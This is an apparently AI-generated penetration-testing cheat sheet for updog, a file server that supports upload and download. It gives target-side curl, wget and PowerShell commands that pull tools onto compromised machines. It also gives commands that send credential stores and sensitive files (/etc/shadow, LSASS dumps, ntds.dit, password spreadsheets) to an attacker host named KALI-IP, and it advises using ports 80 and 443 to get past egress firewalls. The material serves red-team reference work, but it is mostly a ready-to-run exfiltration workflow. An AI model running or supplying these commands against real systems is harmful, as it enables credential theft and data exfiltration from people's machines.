# updog

**Tags:** `#updog` `#filetransfer` `#server` `#upload` `#download` `#linux` `#http`

Replacement for Python's `http.server` that supports **both upload and download** via a web interface. Drag-and-drop file uploads, directory browsing, optional password protection, and HTTPS support — all in one command. The go-to quick file server when you need to receive files from targets (exfil) as well as serve files to them.

**Source:** https://github.com/sc0tfree/updog
**Install:** `pip install updog`

```bash
# Serve current directory on port 9090
updog

# Custom port
updog -p 80
```

> [!note] **updog vs python http.server** — `python3 -m http.server` is download-only. updog adds file upload support with a simple web UI — targets can browse to `http://KALI-IP:PORT` and upload files directly. No custom receiver script needed.

---

## Basic Usage

```bash
# Serve current directory (default port 9090)
updog

# Custom port
updog -p 80
updog -p 8080

# Serve specific directory
updog -d /opt/tools
updog -d /tmp/exfil

# Password protect the server
updog -p 80 --password P@ssword

# HTTPS with self-signed cert (generates automatically)
updog -p 443 --ssl
```

---

## Downloading from Updog (Target-Side)

```bash
# Linux target
curl http://KALI-IP/tool.exe -o /tmp/tool.exe
wget http://KALI-IP/tool.sh -O /tmp/tool.sh
```

```powershell
# Windows target
iwr http://KALI-IP/tool.exe -OutFile C:\Temp\tool.exe
(New-Object Net.WebClient).DownloadFile('http://KALI-IP/tool.exe','C:\Temp\tool.exe')
```

---

## Uploading to Updog (Exfil from Target)

```bash
# Linux — upload file via curl (multipart)
curl -X POST http://KALI-IP:9090/ -F "file=@/etc/passwd"
curl -X POST http://KALI-IP:9090/ -F "file=@/tmp/lsass.dmp"

# Upload multiple files
curl -X POST http://KALI-IP:9090/ \
  -F "file=@/etc/passwd" \
  -F "file=@/etc/shadow"

# Upload with password auth
curl -X POST http://KALI-IP:9090/ -u :P@ssword -F "file=@/etc/passwd"
```

```powershell
# Windows — upload file via PowerShell
$wc = New-Object Net.WebClient
$wc.UploadFile('http://KALI-IP:9090/', 'C:\Windows\Temp\lsass.dmp')

# Or via Invoke-WebRequest
$form = @{ file = Get-Item 'C:\sensitive\passwords.xlsx' }
Invoke-WebRequest -Uri 'http://KALI-IP:9090/' -Method POST -Form $form

# curl on Windows 10+
curl -X POST http://KALI-IP:9090/ -F "file=@C:\Windows\Temp\creds.json"
```

---

## Exfil Workflow

```bash
# 1. On Kali — start updog pointed at exfil collection directory
mkdir /tmp/exfil
updog -d /tmp/exfil -p 80

# 2. Target sends files
# Linux:
curl -X POST http://KALI-IP/ -F "file=@/etc/shadow"
# Windows:
curl -X POST http://KALI-IP/ -F "file=@C:\Windows\NTDS\ntds.dit"

# 3. Files land in /tmp/exfil/ on Kali
ls /tmp/exfil/
```

---

## Common Options

| Flag | Description |
|---|---|
| `-d <path>` | Directory to serve (default: current) |
| `-p <port>` | Port (default: 9090) |
| `--password <pw>` | Require password for all access |
| `--ssl` | Enable HTTPS with auto-generated cert |

---

## OPSEC Notes

- updog logs all requests to stdout — monitor for unexpected connections
- Default port 9090 is non-standard and less likely to be whitelisted outbound — use port 80/443 for egress through strict firewalls
- Password-protect with `--password` when the engagement network has other hosts that could stumble onto the server
- Files uploaded land with their original filename — watch for path traversal if serving a shared directory

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
